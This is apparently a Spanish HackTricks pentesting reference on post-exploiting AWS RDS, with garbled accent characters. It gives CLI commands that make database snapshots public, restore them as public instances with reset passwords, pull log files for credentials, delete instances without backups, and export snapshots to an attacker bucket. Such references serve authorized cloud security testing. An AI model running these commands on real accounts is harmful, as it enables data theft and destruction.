# AWS - Post Explotaci√≥n de RDS

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## RDS

Para obtener m√°s informaci√≥n, consulta:

{% content-ref url="../aws-services/aws-databases/aws-relational-database-rds-enum.md" %}
[aws-relational-database-rds-enum.md](../aws-services/aws-databases/aws-relational-database-rds-enum.md)
{% endcontent-ref %}

### `rds:CreateDBSnapshot`, `rds:RestoreDBInstanceFromDBSnapshot`, `rds:ModifyDBInstance`

Si el atacante tiene suficientes permisos, podr√≠a hacer que una **BD sea accesible p√∫blicamente** creando una instant√°nea de la BD y luego una BD accesible p√∫blicamente a partir de la instant√°nea.

```bash
aws rds describe-db-instances # Obtener el identificador de la BD

aws rds create-db-snapshot \
    --db-instance-identifier <db-id> \
    --db-snapshot-identifier cloudgoat

# Obtener grupos de subred y grupos de seguridad
aws rds describe-db-subnet-groups
aws ec2 describe-security-groups

aws rds restore-db-instance-from-db-snapshot \
    --db-instance-identifier "new-db-not-malicious" \
    --db-snapshot-identifier <scapshotId> \
    --db-subnet-group-name <db subnet group> \
    --publicly-accessible \
    --vpc-security-group-ids <ec2-security group>

aws rds modify-db-instance \
    --db-instance-identifier "new-db-not-malicious" \
    --master-user-password 'Llaody2f6.123' \
    --apply-immediately

# Con√©ctate a la nueva BD despu√©s de unos minutos
```

### `rds:ModifyDBSnapshotAttribute`, `rds:CreateDBSnapshot`

Un atacante con estos permisos podr√≠a **crear una instant√°nea de una BD** y hacerla **disponible p√∫blicamente**. Luego, simplemente podr√≠a crear en su propia cuenta una BD a partir de esa instant√°nea.

Si el atacante **no tiene el permiso `rds:CreateDBSnapshot`**, a√∫n podr√≠a hacer que **otras** instant√°neas creadas sean **p√∫blicas**.

{% code overflow="wrap" %}
```bash
# crear instant√°nea
aws rds create-db-snapshot --db-instance-identifier <db-instance-identifier> --db-snapshot-identifier <snapshot-name>

# Hacerla p√∫blica
aws rds modify-db-snapshot-attribute --db-snapshot-identifier <snapshot-name> --attribute-name restore --values-to-add all
## Especifica otras cuentas espec√≠ficas en lugar de todas para dar acceso solo a cuentas espec√≠ficas: --values-to-add {"111122223333","444455556666"}
```
{% endcode %}

### `rds:DownloadDBLogFilePortion`

Un atacante con el permiso `rds:DownloadDBLogFilePortion` puede **descargar porciones de los archivos de registro de una instancia de RDS**. Si se registran accidentalmente datos sensibles o credenciales de acceso, el atacante podr√≠a utilizar esta informaci√≥n para escalar sus privilegios o realizar acciones no autorizadas.

{% code overflow="wrap" %}
```bash
aws rds download-db-log-file-portion --db-instance-identifier target-instance --log-file-name error/mysql-error-running.log --starting-token 0 --output text
```
{% endcode %}

**Impacto potencial**: Acceso a informaci√≥n sensible o acciones no autorizadas utilizando credenciales filtradas.

### `rds:DeleteDBInstance`

Un atacante con estos permisos puede **denegar el servicio de las instancias de RDS existentes**.

{% code overflow="wrap" %}
```bash
# Eliminar
aws rds delete-db-instance --db-instance-identifier target-instance --skip-final-snapshot
```
{% endcode %}

**Impacto potencial**: Eliminaci√≥n de instancias de RDS existentes y posible p√©rdida de datos.

### `rds:StartExportTask`

{% hint style="info" %}
TODO: Probar
{% endhint %}

Un atacante con este permiso puede **exportar una instant√°nea de una instancia de RDS a un bucket de S3**. Si el atacante tiene control sobre el bucket de destino de S3, podr√≠a acceder potencialmente a datos sensibles dentro de la instant√°nea exportada.

{% code overflow="wrap" %}
```bash
aws rds start-export-task --export-task-identifier attacker-export-task --source-arn arn:aws:rds:region:account-id:snapshot:target-snapshot --s3-bucket-name attacker-bucket --iam-role-arn arn:aws:iam::account-id:role/export-role --kms-key-id arn:aws:kms:region:account-id:key/key-id
```
{% endcode %}

**Impacto potencial**: Acceso a datos sensibles en la instant√°nea exportada.